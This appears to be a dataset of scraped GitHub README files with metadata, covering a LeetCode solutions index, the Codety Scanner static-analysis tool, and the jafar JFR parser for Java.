| 440            | K-th Smallest in Lexicographical Order  | [C++](./Algorithms/src/440.%20K-th%20Smallest%20in%20Lexicographical%20Order/Code/solution.cpp), [Java](./Algorithms/src/440.%20K-th%20Smallest%20in%20Lexicographical%20Order/Code/solution.java), [JavaScript](./Algorithms/src/440.%20K-th%20Smallest%20in%20Lexicographical%20Order/Code/solution.js), [Python](./Algorithms/src/440.%20K-th%20Smallest%20in%20Lexicographical%20Order/Code/solution.py), [Go](./Algorithms/src/440.%20K-th%20Smallest%20in%20Lexicographical%20Order/Code/solution.go) | [Explanation](./Algorithms/src/440.%20K-th%20Smallest%20in%20Lexicographical%20Order/Explanation/explanation.md)   | Hard             |
| 476            | Number Complement  | [C++](./Algorithms/src/476.%20Number%20Complement/Code/solution.cpp), [Java](./Algorithms/src/476.%20Number%20Complement/Code/solution.java), [JavaScript](./Algorithms/src/476.%20Number%20Complement/Code/solution.js), [Python](./Algorithms/src/476.%20Number%20Complement/Code/solution.py), [Go](./Algorithms/src/476.%20Number%20Complement/Code/solution.go) | [Explanation](./Algorithms/src/476.%20Number%20Complement/Explanation/explanation.md)   | Easy             |
| 567            | Permutation in String  | [C++](./Algorithms/src/567.%20Permutation%20in%20String/Code/solution.cpp), [Java](./Algorithms/src/567.%20Permutation%20in%20String/Code/solution.java), [JavaScript](./Algorithms/src/567.%20Permutation%20in%20String/Code/solution.js), [Python](./Algorithms/src/567.%20Permutation%20in%20String/Code/solution.py), [Go](./Algorithms/src/567.%20Permutation%20in%20String/Code/solution.go) | [Explanation](./Algorithms/src/567.%20Permutation%20in%20String/Explanation/explanation.md)   | Medium             |
| 641            | Design Circular Deque  | [C++](./Algorithms/src/641.%20Design%20Circular%20Deque/Code/solution.cpp), [Java](./Algorithms/src/641.%20Design%20Circular%20Deque/Code/solution.java), [JavaScript](./Algorithms/src/641.%20Design%20Circular%20Deque/Code/solution.js), [Python](./Algorithms/src/641.%20Design%20Circular%20Deque/Code/solution.py), [Go](./Algorithms/src/641.%20Design%20Circular%20Deque/Code/solution.go) | [Explanation](./Algorithms/src/641.%20Design%20Circular%20Deque/Explanation/explanation.md)   | Medium             |
| 650            | 2 Keys Keyboard  | [C++](./Algorithms/src/650.%202%20Keys%20Keyboard/Code/solution.cpp), [Java](./Algorithms/src/650.%202%20Keys%20Keyboard/Code/solution.java), [JavaScript](./Algorithms/src/650.%202%20Keys%20Keyboard/Code/solution.js), [Python](./Algorithms/src/650.%202%20Keys%20Keyboard/Code/solution.py), [Go](./Algorithms/src/650.%202%20Keys%20Keyboard/Code/solution.go) | [Explanation](./Algorithms/src/650.%202%20Keys%20Keyboard/Explanation/explanation.md)   | Medium             |
| 664            | Strange Printer  | [C++](./Algorithms/src/664.%20Strange%20Printer/Code/solution.cpp), [Java](./Algorithms/src/664.%20Strange%20Printer/Code/solution.java), [JavaScript](./Algorithms/src/664.%20Strange%20Printer/Code/solution.js), [Python](./Algorithms/src/664.%20Strange%20Printer/Code/solution.py), [Go](./Algorithms/src/664.%20Strange%20Printer/Code/solution.go) | [Explanation](./Algorithms/src/664.%20Strange%20Printer/Explanation/explanation.md)   | Hard             |
| 703            | Kth Largest Element in a Stream  | [C++](./Algorithms/src/703.%20Kth%20Largest%20Element%20in%20a%20Stream/Code/solution.cpp), [Java](./Algorithms/src/703.%20Kth%20Largest%20Element%20in%20a%20Stream/Code/solution.java), [JavaScript](./Algorithms/src/703.%20Kth%20Largest%20Element%20in%20a%20Stream/Code/solution.js), [Python](./Algorithms/src/703.%20Kth%20Largest%20Element%20in%20a%20Stream/Code/solution.py), [Go](./Algorithms/src/703.%20Kth%20Largest%20Element%20in%20a%20Stream/Code/solution.go) | [Explanation](./Algorithms/src/703.%20Kth%20Largest%20Element%20in%20a%20Stream/Explanation/explanation.md)   | Easy             |
| 719            | Find K-th Smallest Pair Distance  | [C++](./Algorithms/src/719.%20Find%20K-th%20Smallest%20Pair%20Distance/Code/solution.cpp), [Java](./Algorithms/src/719.%20Find%20K-th%20Smallest%20Pair%20Distance/Code/solution.java), [JavaScript](./Algorithms/src/719.%20Find%20K-th%20Smallest%20Pair%20Distance/Code/solution.js), [Python](./Algorithms/src/719.%20Find%20K-th%20Smallest%20Pair%20Distance/Code/solution.py), [Go](./Algorithms/src/719.%20Find%20K-th%20Smallest%20Pair%20Distance/Code/solution.go) | [Explanation](./Algorithms/src/719.%20Find%20K-th%20Smallest%20Pair%20Distance/Explanation/explanation.md)   | Hard             |
| 729            | My Calendar I  | [C++](./Algorithms/src/729.%20My%20Calendar%20I/Code/solution.cpp), [Java](./Algorithms/src/729.%20My%20Calendar%20I/Code/solution.java), [JavaScript](./Algorithms/src/729.%20My%20Calendar%20I/Code/solution.js), [Python](./Algorithms/src/729.%20My%20Calendar%20I/Code/solution.py), [Go](./Algorithms/src/729.%20My%20Calendar%20I/Code/solution.go) | [Explanation](./Algorithms/src/729.%20My%20Calendar%20I/Explanation/explanation.md)   | Medium             |
| 731            | My Calendar II  | [C++](./Algorithms/src/731.%20My%20Calendar%20II/Code/solution.cpp), [Java](./Algorithms/src/731.%20My%20Calendar%20II/Code/solution.java), [JavaScript](./Algorithms/src/731.%20My%20Calendar%20II/Code/solution.js), [Python](./Algorithms/src/731.%20My%20Calendar%20II/Code/solution.py), [Go](./Algorithms/src/731.%20My%20Calendar%20II/Code/solution.go) | [Explanation](./Algorithms/src/731.%20My%20Calendar%20II/Explanation/explanation.md)   | Medium             |
| 840            | Magic Squares In Grid  | [C++](./Algorithms/src/840.%20Magic%20Squares%20In%20Grid/Code/solution.cpp), [Java](./Algorithms/src/840.%20Magic%20Squares%20In%20Grid/Code/solution.java), [JavaScript](./Algorithms/src/840.%20Magic%20Squares%20In%20Grid/Code/solution.js), [Python](./Algorithms/src/840.%20Magic%20Squares%20In%20Grid/Code/solution.py), [Go](./Algorithms/src/840.%20Magic%20Squares%20In%20Grid/Code/solution.go) | [Explanation](./Algorithms/src/840.%20Magic%20Squares%20In%20Grid/Explanation/explanation.md)   | Medium             |
| 885            | Spiral Matrix III  | [C++](./Algorithms/src/885.%20Spiral%20Matrix%20III/Code/solution.cpp), [Java](./Algorithms/src/885.%20Spiral%20Matrix%20III/Code/solution.java), [JavaScript](./Algorithms/src/885.%20Spiral%20Matrix%20III/Code/solution.js), [Python](./Algorithms/src/885.%20Spiral%20Matrix%20III/Code/solution.py), [Go](./Algorithms/src/885.%20Spiral%20Matrix%20III/Code/solution.go) | [Explanation](./Algorithms/src/885.%20Spiral%20Matrix%20III/Explanation/explanation.md)   | Medium             |
| 947            | Most Stones Removed with Same Row or Column  | [C++](./Algorithms/src/947.%20Most%20Stones%20Removed%20with%20Same%20Row%20or%20Column/Code/solution.cpp), [Java](./Algorithms/src/947.%20Most%20Stones%20Removed%20with%20Same%20Row%20or%20Column/Code/solution.java), [JavaScript](./Algorithms/src/947.%20Most%20Stones%20Removed%20with%20Same%20Row%20or%20Column/Code/solution.js), [Python](./Algorithms/src/947.%20Most%20Stones%20Removed%20with%20Same%20Row%20or%20Column/Code/solution.py), [Go](./Algorithms/src/947.%20Most%20Stones%20Removed%20with%20Same%20Row%20or%20Column/Code/solution.go) | [Explanation](./Algorithms/src/947.%20Most%20Stones%20Removed%20with%20Same%20Row%20or%20Column/Explanation/explanation.md)   | Medium             |
| 959            | Regions Cut By Slashes  | [C++](./Algorithms/src/959.%20Regions%20Cut%20By%20Slashes/Code/solution.cpp), [Java](./Algorithms/src/959.%20Regions%20Cut%20By%20Slashes/Code/solution.java), [JavaScript](./Algorithms/src/959.%20Regions%20Cut%20By%20Slashes/Code/solution.js), [Python](./Algorithms/src/959.%20Regions%20Cut%20By%20Slashes/Code/solution.py), [Go](./Algorithms/src/959.%20Regions%20Cut%20By%20Slashes/Code/solution.go) | [Explanation](./Algorithms/src/959.%20Regions%20Cut%20By%20Slashes/Explanation/explanation.md)   | Medium             |
| 1105            | Filling Bookcase Shelves  | [C++](./Algorithms/src/1105.%20Filling%20Bookcase%20Shelves/Code/solution.cpp), [Java](./Algorithms/src/1105.%20Filling%20Bookcase%20Shelves/Code/solution.java), [JavaScript](./Algorithms/src/1105.%20Filling%20Bookcase%20Shelves/Code/solution.js), [Python](./Algorithms/src/1105.%20Filling%20Bookcase%20Shelves/Code/solution.py), [Go](./Algorithms/src/1105.%20Filling%20Bookcase%20Shelves/Code/solution.go) | [Explanation](./Algorithms/src/1105.%20Filling%20Bookcase%20Shelves/Explanation/explanation.md)   | Medium             |
| 1140            | Stone Game II  | [C++](./Algorithms/src/1140.%20Stone%20Game%20II/Code/solution.cpp), [Java](./Algorithms/src/1140.%20Stone%20Game%20II/Code/solution.java), [JavaScript](./Algorithms/src/1140.%20Stone%20Game%20II/Code/solution.js), [Python](./Algorithms/src/1140.%20Stone%20Game%20II/Code/solution.py), [Go](./Algorithms/src/1140.%20Stone%20Game%20II/Code/solution.go) | [Explanation](./Algorithms/src/1140.%20Stone%20Game%20II/Explanation/explanation.md)   | Medium             |
| 1331            | Rank Transform of an Array  | [C++](./Algorithms/src/1331.%20Rank%20Transform%20of%20an%20Array/Code/solution.cpp), [Java](./Algorithms/src/1331.%20Rank%20Transform%20of%20an%20Array/Code/solution.java), [JavaScript](./Algorithms/src/1331.%20Rank%20Transform%20of%20an%20Array/Code/solution.js), [Python](./Algorithms/src/1331.%20Rank%20Transform%20of%20an%20Array/Code/solution.py), [Go](./Algorithms/src/1331.%20Rank%20Transform%20of%20an%20Array/Code/solution.go) | [Explanation](./Algorithms/src/1331.%20Rank%20Transform%20of%20an%20Array/Explanation/explanation.md)   | Easy             |
| 1381            | Design a Stack With Increment Operation  | [C++](./Algorithms/src/1381.%20Design%20a%20Stack%20With%20Increment%20Operation/Code/solution.cpp), [Java](./Algorithms/src/1381.%20Design%20a%20Stack%20With%20Increment%20Operation/Code/solution.java), [JavaScript](./Algorithms/src/1381.%20Design%20a%20Stack%20With%20Increment%20Operation/Code/solution.js), [Python](./Algorithms/src/1381.%20Design%20a%20Stack%20With%20Increment%20Operation/Code/solution.py), [Go](./Algorithms/src/1381.%20Design%20a%20Stack%20With%20Increment%20Operation/Code/solution.go) | [Explanation](./Algorithms/src/1381.%20Design%20a%20Stack%20With%20Increment%20Operation/Explanation/explanation.md)   | Medium             |
| 1460            | Make Two Arrays Equal by Reversing Subarrays  | [C++](./Algorithms/src/1460.%20Make%20Two%20Arrays%20Equal%20by%20Reversing%20Subarrays/Code/solution.cpp), [Java](./Algorithms/src/1460.%20Make%20Two%20Arrays%20Equal%20by%20Reversing%20Subarrays/Code/solution.java), [JavaScript](./Algorithms/src/1460.%20Make%20Two%20Arrays%20Equal%20by%20Reversing%20Subarrays/Code/solution.js), [Python](./Algorithms/src/1460.%20Make%20Two%20Arrays%20Equal%20by%20Reversing%20Subarrays/Code/solution.py), [Go](./Algorithms/src/1598.1460.%20Make%20Two%20Arrays%20Equal%20by%20Reversing%20Subarrays/solution.go) | [Explanation](./Algorithms/src/1460.%20Make%20Two%20Arrays%20Equal%20by%20Reversing%20Subarrays/Explanation/explanation.md)   | Easy             |
| 1497            | Check If Array Pairs Are Divisible by k  | [C++](./Algorithms/src/1497.%20Check%20If%20Array%20Pairs%20Are%20Divisible%20by%20k/Code/solution.cpp), [Java](./Algorithms/src/1497.%20Check%20If%20Array%20Pairs%20Are%20Divisible%20by%20k/Code/solution.java), [JavaScript](./Algorithms/src/1497.%20Check%20If%20Array%20Pairs%20Are%20Divisible%20by%20k/Code/solution.js), [Python](./Algorithms/src/1497.%20Check%20If%20Array%20Pairs%20Are%20Divisible%20by%20k/Code/solution.py), [Go](./Algorithms/src/1598.1497.%20Check%20If%20Array%20Pairs%20Are%20Divisible%20by%20k/solution.go) | [Explanation](./Algorithms/src/1497.%20Check%20If%20Array%20Pairs%20Are%20Divisible%20by%20k/Explanation/explanation.md)   | Medium             |
| 1509            | Minimum Difference Between Largest and Smallest Value in Three Moves  | [C++](./Algorithms/src/1509.%20Minimum%20Difference%20Between%20Largest%20and%20Smallest%20Value%20in%20Three%20Moves/Code/solution.cpp), [Java](./Algorithms/src/1509.%20Minimum%20Difference%20Between%20Largest%20and%20Smallest%20Value%20in%20Three%20Moves/Code/solution.java), [JavaScript](./Algorithms/src/1509.%20Minimum%20Difference%20Between%20Largest%20and%20Smallest%20Value%20in%20Three%20Moves/Code/solution.js), [Python](./Algorithms/src/1509.%20Minimum%20Difference%20Between%20Largest%20and%20Smallest%20Value%20in%20Three%20Moves/Code/solution.py), [Go](./Algorithms/src/1509.%20Minimum%20Difference%20Between%20Largest%20and%20Smallest%20Value%20in%20Three%20Moves/Code/solution.go) | [Explanation](./Algorithms/src/1509.%20Minimum%20Difference%20Between%20Largest%20and%20Smallest%20Value%20in%20Three%20Moves/Explanation/explanation.md)   | Medium             |
| 1568            | Minimum Number of Days to Disconnect Island  | [C++](./Algorithms/src/1568.%20Minimum%20Number%20of%20Days%20to%20Disconnect%20Island/Code/solution.cpp), [Java](./Algorithms/src/1568.%20Minimum%20Number%20of%20Days%20to%20Disconnect%20Island/Code/solution.java), [JavaScript](./Algorithms/src/1568.%20Minimum%20Number%20of%20Days%20to%20Disconnect%20Island/Code/solution.js), [Python](./Algorithms/src/1568.%20Minimum%20Number%20of%20Days%20to%20Disconnect%20Island/Code/solution.py), [Go](./Algorithms/src/1568.%20Minimum%20Number%20of%20Days%20to%20Disconnect%20Island/Code/solution.go) | [Explanation](./Algorithms/src/1568.%20Minimum%20Number%20of%20Days%20to%20Disconnect%20Island/Explanation/explanation.md)   | Hard             |
| 1590            | Make Sum Divisible by P  | [C++](./Algorithms/src/1590.%20Make%20Sum%20Divisible%20by%20P/Code/solution.cpp), [Java](./Algorithms/src/1590.%20Make%20Sum%20Divisible%20by%20P/Code/solution.java), [JavaScript](./Algorithms/src/1590.%20Make%20Sum%20Divisible%20by%20P/Code/solution.js), [Python](./Algorithms/src/1590.%20Make%20Sum%20Divisible%20by%20P/Code/solution.py), [Go](./Algorithms/src/1590.%20Make%20Sum%20Divisible%20by%20P/Code/solution.go) | [Explanation](./Algorithms/src/1590.%20Make%20Sum%20Divisible%20by%20P/Explanation/explanation.md)   | Medium             |
| 1598            | Crawler Log Folder  | [C++](./Algorithms/src/1598.%20Crawler%20Log%20Folder/Code/solution.cpp), [Java](./Algorithms/src/1598.%20Crawler%20Log%20Folder/Code/solution.java), [JavaScript](./Algorithms/src/1598.%20Crawler%20Log%20Folder/Code/solution.js), [Python](./Algorithms/src/1598.%20Crawler%20Log%20Folder/Code/solution.py), [Go](./Algorithms/src/1598.%20Crawler%20Log%20Folder/Code/solution.go) | [Explanation](./Algorithms/src/1598.%20Crawler%20Log%20Folder/Explanation/explanation.md)   | Easy             |
| 1701            | Average Waiting Time  | [C++](./Algorithms/src/1701.%20Average%20Waiting%20Time/Code/solution.cpp), [Java](./Algorithms/src/1701.%20Average%20Waiting%20Time/Code/solution.java), [JavaScript](./Algorithms/src/1701.%20Average%20Waiting%20Time/Code/solution.js), [Python](./Algorithms/src/1701.%20Average%20Waiting%20Time/Code/solution.py), [Go](./Algorithms/src/1701.%20Average%20Waiting%20Time/Code/solution.go) | [Explanation](./Algorithms/src/1701.%20Average%20Waiting%20Time/Explanation/explanation.md)   | Medium             |
| 1813            | Sentence Similarity III  | [C++](./Algorithms/src/1813.%20Sentence%20Similarity%20III/Code/solution.cpp), [Java](./Algorithms/src/1813.%20Sentence%20Similarity%20III/Code/solution.java), [JavaScript](./Algorithms/src/1813.%20Sentence%20Similarity%20III/Code/solution.js), [Python](./Algorithms/src/1813.%20Sentence%20Similarity%20III/Code/solution.py), [Go](./Algorithms/src/1813.%20Sentence%20Similarity%20III/Code/solution.go) | [Explanation](./Algorithms/src/1813.%20Sentence%20Similarity%20III/Explanation/explanation.md)   | Medium             |
| 1823            | Find the Winner of the Circular Game  | [C++](./Algorithms/src/1823.%20Find%20the%20Winner%20of%20the%20Circular%20Game/Code/solution.cpp), [Java](./Algorithms/src/1823.%20Find%20the%20Winner%20of%20the%20Circular%20Game/Code/solution.java), [JavaScript](./Algorithms/src/1823.%20Find%20the%20Winner%20of%20the%20Circular%20Game/Code/solution.js), [Python](./Algorithms/src/1823.%20Find%20the%20Winner%20of%20the%20Circular%20Game/Code/solution.py), [Go](./Algorithms/src/1823.%20Find%20the%20Winner%20of%20the%20Circular%20Game/Code/solution.go) | [Explanation](./Algorithms/src/1823.%20Find%20the%20Winner%20of%20the%20Circular%20Game/Explanation/explanation.md)   | Medium             |
| 1894            | Find the Winner of the Circular Game  | [C++](./Algorithms/src/1823.%20Find%20the%20Winner%20of%20the%20Circular%20Game/Code/solution.cpp), [Java](./Algorithms/src/1823.%20Find%20the%20Winner%20of%20the%20Circular%20Game/Code/solution.java), [JavaScript](./Algorithms/src/1823.%20Find%20the%20Winner%20of%20the%20Circular%20Game/Code/solution.js), [Python](./Algorithms/src/1823.%20Find%20the%20Winner%20of%20the%20Circular%20Game/Code/solution.py), [Go](./Algorithms/src/1823.%20Find%20the%20Winner%20of%20the%20Circular%20Game/Code/solution.go) | [Explanation](./Algorithms/src/1823.%20Find%20the%20Winner%20of%20the%20Circular%20Game/Explanation/explanation.md)   | Medium             |
| 1937            | Maximum Number of Points with Cost  | [C++](./Algorithms/src/1937.%20Maximum%20Number%20of%20Points%20with%20Cost/Code/solution.cpp), [Java](./Algorithms/src/1937.%20Maximum%20Number%20of%20Points%20with%20Cost/Code/solution.java), [JavaScript](./Algorithms/src/1937.%20Maximum%20Number%20of%20Points%20with%20Cost/Code/solution.js), [Python](./Algorithms/src/1937.%20Maximum%20Number%20of%20Points%20with%20Cost/Code/solution.py), [Go](./Algorithms/src/1937.%20Maximum%20Number%20of%20Points%20with%20Cost/Code/solution.go) | [Explanation](./Algorithms/src/1937.%20Maximum%20Number%20of%20Points%20with%20Cost/Explanation/explanation.md)   | Medium             |
| 2022            | Convert 1D Array Into 2D Array  | [C++](./Algorithms/src/2022.%20Convert%201D%20Array%20Into%202D%20Array/Code/solution.cpp), [Java](./Algorithms/src/2022.%20Convert%201D%20Array%20Into%202D%20Array/Code/solution.java), [JavaScript](./Algorithms/src/2022.%20Convert%201D%20Array%20Into%202D%20Array/Code/solution.js), [Python](./Algorithms/src/2022.%20Convert%201D%20Array%20Into%202D%20Array/Code/solution.py), [Go](./Algorithms/src/2022.%20Convert%201D%20Array%20Into%202D%20Array/Code/solution.go) | [Explanation](./Algorithms/src/2022.%20Convert%201D%20Array%20Into%202D%20Array/Explanation/explanation.md)   | Easy             |
| 2053            | Kth Distinct String in an Array  | [C++](./Algorithms/src/2053.%20Kth%20Distinct%20String%20in%20an%20Array/Code/solution.cpp), [Java](./Algorithms/src/2053.%20Kth%20Distinct%20String%20in%20an%20Array/Code/solution.java), [JavaScript](./Algorithms/src/2053.%20Kth%20Distinct%20String%20in%20an%20Array/Code/solution.js), [Python](./Algorithms/src/2053.%20Kth%20Distinct%20String%20in%20an%20Array/Code/solution.py), [Go](./Algorithms/src/2053.%20Kth%20Distinct%20String%20in%20an%20Array/Code/solution.go) | [Explanation](./Algorithms/src/2053.%20Kth%20Distinct%20String%20in%20an%20Array/Explanation/explanation.md)   | Easy             |
| 2134            | Minimum Swaps to Group All 1's Together II  | [C++](./Algorithms/src/2134.%20Minimum%20Swaps%20to%20Group%20All%201's%20Together%20II/Code/solution.cpp), [Java](./Algorithms/src/2134.%20Minimum%20Swaps%20to%20Group%20All%201's%20Together%20II/Code/solution.java), [JavaScript](./Algorithms/src/2134.%20Minimum%20Swaps%20to%20Group%20All%201's%20Together%20II/Code/solution.js), [Python](./Algorithms/src/2134.%20Minimum%20Swaps%20to%20Group%20All%201's%20Together%20II/Code/solution.py), [Go](./Algorithms/src/2134.%20Minimum%20Swaps%20to%20Group%20All%201's%20Together%20II/Code/solution.go) | [Explanation](./Algorithms/src/2134.%20Minimum%20Swaps%20to%20Group%20All%201's%20Together%20II/Explanation/explanation.md)   | Medium             |
| 2416            | Sum of Prefix Scores of Strings  | [C++](./Algorithms/src/2416.%20Sum%20of%20Prefix%20Scores%20of%20Strings/Code/solution.cpp), [Java](./Algorithms/src/2416.%20Sum%20of%20Prefix%20Scores%20of%20Strings/Code/solution.java), [JavaScript](./Algorithms/src/2416.%20Sum%20of%20Prefix%20Scores%20of%20Strings/Code/solution.js), [Python](./Algorithms/src/2416.%20Sum%20of%20Prefix%20Scores%20of%20Strings/Code/solution.py), [Go](./Algorithms/src/2416.%20Sum%20of%20Prefix%20Scores%20of%20Strings/Code/solution.go) | [Explanation](./Algorithms/src/2416.%20Sum%20of%20Prefix%20Scores%20of%20Strings/Explanation/explanation.md)   | Hard             |
| 2491            | Divide Players Into Teams of Equal Skill  | [C++](./Algorithms/src/2491.%20Divide%20Players%20Into%20Teams%20of%20Equal%20Skill/Code/solution.cpp), [Java](./Algorithms/src/2491.%20Divide%20Players%20Into%20Teams%20of%20Equal%20Skill/Code/solution.java), [JavaScript](./Algorithms/src/2491.%20Divide%20Players%20Into%20Teams%20of%20Equal%20Skill/Code/solution.js), [Python](./Algorithms/src/2491.%20Divide%20Players%20Into%20Teams%20of%20Equal%20Skill/Code/solution.py), [Go](./Algorithms/src/2491.%20Divide%20Players%20Into%20Teams%20of%20Equal%20Skill/Code/solution.go) | [Explanation](./Algorithms/src/2491.%20Divide%20Players%20Into%20Teams%20of%20Equal%20Skill/Explanation/explanation.md)   | Medium             |
| 2678            | Number of Senior Citizens  | [C++](./Algorithms/src/2678.%20Number%20of%20Senior%20Citizens/Code/solution.cpp), [Java](./Algorithms/src/2678.%20Number%20of%20Senior%20Citizens/Code/solution.java), [JavaScript](./Algorithms/src/2678.%20Number%20of%20Senior%20Citizens/Code/solution.js), [Python](./Algorithms/src/2678.%20Number%20of%20Senior%20Citizens/Code/solution.py), [Go](./Algorithms/src/2678.%20Number%20of%20Senior%20Citizens/Code/solution.go) | [Explanation](./Algorithms/src/2678.%20Number%20of%20Senior%20Citizens/Explanation/explanation.md)   | Easy             |
| 2696            | Minimum String Length After Removing Substrings  | [C++](./Algorithms/src/2696.%20Minimum%20String%20Length%20After%20Removing%20Substrings/Code/solution.cpp), [Java](./Algorithms/src/2696.%20Minimum%20String%20Length%20After%20Removing%20Substrings/Code/solution.java), [JavaScript](./Algorithms/src/2696.%20Minimum%20String%20Length%20After%20Removing%20Substrings/Code/solution.js), [Python](./Algorithms/src/2696.%20Minimum%20String%20Length%20After%20Removing%20Substrings/Code/solution.py), [Go](./Algorithms/src/2696.%20Minimum%20String%20Length%20After%20Removing%20Substrings/Code/solution.go) | [Explanation](./Algorithms/src/2696.%20Minimum%20String%20Length%20After%20Removing%20Substrings/Explanation/explanation.md)   | Easy             |
| 2707            | Extra Characters in a String  | [C++](./Algorithms/src/2707.%20Extra%20Characters%20in%20a%20String/Code/solution.cpp), [Java](./Algorithms/src/2707.%20Extra%20Characters%20in%20a%20String/Code/solution.java), [JavaScript](./Algorithms/src/2707.%20Extra%20Characters%20in%20a%20String/Code/solution.js), [Python](./Algorithms/src/2707.%20Extra%20Characters%20in%20a%20String/Code/solution.py), [Go](./Algorithms/src/2707.%20Extra%20Characters%20in%20a%20String/Code/solution.go) | [Explanation](./Algorithms/src/2707.%20Extra%20Characters%20in%20a%20String/Explanation/explanation.md)   | Medium             |
| 2751            | Robot Collisions  | [C++](./Algorithms/src/2751.%20Robot%20Collisions/Code/solution.cpp), [Java](./Algorithms/src/2751.%20Robot%20Collisions/Code/solution.java), [JavaScript](./Algorithms/src/2751.%20Robot%20Collisions/Code/solution.js), [Python](./Algorithms/src/2751.%20Robot%20Collisions/Code/solution.py), [Go](./Algorithms/src/2751.%20Robot%20Collisions/Code/solution.go) | [Explanation](./Algorithms/src/2751.%20Robot%20Collisions/Explanation/explanation.md)   | Hard             |
| 3043            | Find the Length of the Longest Common Prefix  | [C++](./Algorithms/src/3043.%20Find%20the%20Length%20of%20the%20Longest%20Common%20Prefix/Code/solution.cpp), [Java](./Algorithms/src/3043.%20Find%20the%20Length%20of%20the%20Longest%20Common%20Prefix/Code/solution.java), [JavaScript](./Algorithms/src/3043.%20Find%20the%20Length%20of%20the%20Longest%20Common%20Prefix/Code/solution.js), [Python](./Algorithms/src/3043.%20Find%20the%20Length%20of%20the%20Longest%20Common%20Prefix/Code/solution.py), [Go](./Algorithms/src/3043.%20Find%20the%20Length%20of%20the%20Longest%20Common%20Prefix/Code/solution.go) | [Explanation](./Algorithms/src/3043.%20Find%20the%20Length%20of%20the%20Longest%20Common%20Prefix/Explanation/explanation.md)   | Medium             |

## Contributors

<!-- - John Doe [@johndoe](https://github.com/johndoe)
- Jane Smith [@janesmith](https://github.com/janesmith) -->

Certainly! Here's the professional rewrite for the ""How to Contribute"" section:

## How to Contribute

We welcome contributions to improve and expand our repository of LeetCode solutions. To contribute, follow these steps:

1. **Fork** the repository on GitHub.
2. **Create a new branch** from `main` (`git checkout -b feature/add-new-solution`).
3. **Add** your solution for a new or existing problem in the designated format.
4. **Commit** your changes (`git commit -am 'Add new solution for Problem X'`).
5. **Push** your branch to your fork (`git push origin feature/add-new-solution`).
6. **Submit** a Pull Request, providing a brief description of your changes.

Thank you for helping us make these solutions accessible and valuable to the community!
",0,0,1,0.0,"['leetcode', 'solution', 'table', 'content', 'contributor', 'how', 'contribute']","['leetcode', 'solution', 'table', 'content', 'contributor']"
codetyio/codety-scanner,main,"<div align=""center"">

![image](https://www.codety.io/assets/img/logo_500.png)

</div>

**Codety Scanner** is a comprehensive code scanner designed to detect code issues for 30+ programming languages and IaC frameworks. It embeds more than 6,000 code analysis rules and can detect code smells, vulnerable code, secrets in the code, performance issues, style violations, and more. Codety Scanner is open source and is free for personal and commercial use, Codety Scanner's source code is contributed and maintained by [Codety Inc.(https://codety.io)](https://codety.io)

Codety Scanner detects your code issues and report results to:
* GitHub pull request comments ([check example here](https://github.com/codetyio/codety-scanner/pull/15#issuecomment-2320351633))
* GitHub pull request review comments ([check example here](https://github.com/codetyio/codety-scanner/pull/15/files#r1738123885))
* GitHub check run annotations ([check example here](https://github.com/codetyio/codety-scanner/actions/runs/10786005219/job/29912189435))
* Slack
* GitLab merge request review comments(coming...)

Codety Scanner provides out-of-box integrations with pmd, eslint, checkov, cppcheck, checkov, golangci-lint, phpstan, pmd, pylint, rubocop, scalastyle, shellcheck, stylelint, trivy, etc.

![image](https://www.codety.io/assets/img/hero-3.png)

### Codety Scanner can:
* Detect code issues like:  
  * Insecure and vulnerable code
  * Unexpected secrets/tokens/API-keys in the code
  * Code smells and technical debt accumulation
  * Code style violations
  * Some performance issues
  * And more...
* Support 30+ programming languages and IaC frameworks:
  * Terraform code(AWS, GCP, Azure and OCI)
  * Java
  * Python
  * Javascript
  * Typescript
  * C
  * C++
  * Go
  * Ruby
  * Scala
  * Shell(sh, bash, dash, ksh, busybox)
  * Html
  * Css
  * Php
  * Kotlin
  * Swift
  * JSP
  * Apex
  * Modelica
  * Plsql
  * XML, XSL, WSDL
  * CloudFormation
  * Serverless framework
  * Helm charts
  * Kubernetes
  * Docker
  * and more
 

### How to use:
Check document [Codety Scanner Quickstart](https://docs.codety.io/docs/quickstart/index)

### License:
https://github.com/codetyio/codety-scanner/blob/main/LICENSE.txt

### Welcome new contributors
We greatly value contributions of any kind. Contributions could include, but are not limited to documentation improvements, bug reports, new or improved code! Check more at [CONTRIBUTING.md](https://github.com/codetyio/codety-scanner/blob/main/CONTRIBUTING.md)

<br/>

> [!NOTE]
> **Codety Scanner** detect code issues using default recommended code scanning rules for general use cases, [**Codety Console**](http://www.codety.io) is a subscription-based product that helps you manage and custom code standards according to your organization's needs.
 
",1,2,58,95.0,"['codety', 'scanner', 'can', 'how', 'use', 'license', 'welcome', 'new', 'contributor']","['codety', 'scanner', 'can', 'how', 'use']"
jbachorik/jafar,main,"# jafar
Experimental, incomplete JFR parser

Very much a work in progress. 
The goal is to be able to parse JFR files and extract the event data in programmatic way with the least effort possible.

## Requirements
Java 21 (mostly just because I wanted to try the pattern matching)

## Tl;DR
Allow quickly wiring JFR with interface based handlers using bytecode generation.
I was nerdsniped by [@nitsanw](https://github.com/nitsanw) and quickly thrown together this more or less a PoC.

The parser is pretty fast, actually. You can try the demo app which will extract all the `jdk.ExecutionSample` events,
count the number of samples and calculate the sum of the associated thread ids (useful, right?). On Mac M1 and ~600MiB
JFR this takes around 1 second as compared to cca. 7 seconds using JMC parser. The JDK `jfr` tool will run out of memory,
but to be fair it is trying to print the full content of each event.

After the project is build via `./gradlew shadowJar` you can run the demo app with:
```shell
# The Jafar parser
java -jar demo/build/libs/demo-all.jar [jafar|jmc|jfr] path_to_jfr.jfr
```

## Usage
The main idea is to define a handling interface which corresponds to a JFR event type. The linking is done via `@JfrType` 
annotation. For convenience, there is a `JfrEvent` interface which can be extended to define the event handling interface.

The interface methods should correspond to the fields of the JFR event. The method names should be the same as the field names.
If the field name is not a valid Java identifier, the method will be linked with the field via `@JfrField` annotation.
The interface can have methods excluded from linking with the JFR types - by annotating such methods with `@JfrIgnore`.

```java

@JfrType(""custom.MyEvent"")
public interface MyEvent extends JfrEvent {
  String myfield();
}

try (JafarParser parser = JafarParser.open(""path_to_jfr.jfr"")) {}
    // registering a handler will return a cookie which can be used to deregister the same handler
    var cookie = parser.handle(MyEvent.class, event -> {
        System.out.println(event.startTime());
        System.out.println(event.eventThread().javaName());
        System.out.println(event.myfield());
    });
    parser.handle(MyEvent.class, event -> {
        // do something else
    });
    parser.run();
    
    cookie.destroy(parser);
    // this time only the second handler will be called
    parser.run();
}

```

This short program will parse the recording and call the `handle` method for each `custom.MyEvent` event.
The number of handlers per type is not limited, they all will be executed sequentially.
With the handlers known beforehand, the parser can safely skip all unreachable events and types, massively saving on the parsing time.
